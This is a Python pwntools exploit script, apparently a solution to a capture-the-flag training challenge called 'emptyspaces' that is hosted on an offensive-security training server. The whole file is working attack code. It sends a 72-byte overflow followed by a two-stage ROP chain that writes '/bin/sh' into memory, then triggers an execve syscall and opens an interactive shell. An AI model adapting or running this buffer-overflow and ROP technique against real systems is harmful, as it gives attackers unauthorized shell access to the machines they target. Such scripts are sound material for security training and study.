from pwn import *
import time

context.terminal = ['tmux', 'splitw', '-h']

if "REMOTE" not in args:
    r = process("./emptyspaces")
    gdb.attach(r, '''
               #b *0x00400bfd
               c
               ''')
    input("wait")
else:
    r = remote("bin.training.offdef.it", 4006)

pop_rdi = 0x0000000000400696
pop_rsi = 0x0000000000410133
pop_rdx = 0x000000000044bd36
pop_rax = 0x00000000004155a4
binsh = 0x6b6000
read = 0x004497b0 
buf = 0x7fffffffdd40
read_main = 0x00400bfd
main_main= 0x00400b95
syscall = 0x000000000040128c
pop_rdx_rsi = 0x000000000044bd59

payload = p64(pop_rdi) + p64(0) + p64(pop_rsi) + p64(binsh) + p64(pop_rdx) + p64(8) + p64(read) + p64(main_main)
payload2 = p64(pop_rdx_rsi) + p64(0) + p64(0) + p64(pop_rdi) + p64(binsh) + p64(pop_rax) + p64(0x3b) + p64(syscall)

time.sleep(0.1)
r.send(b"A"*72 + payload)
time.sleep(0.1)
r.send("/bin/sh\x00")
time.sleep(0.1)
r.send(b"A"*72 + payload2)

r.interactive()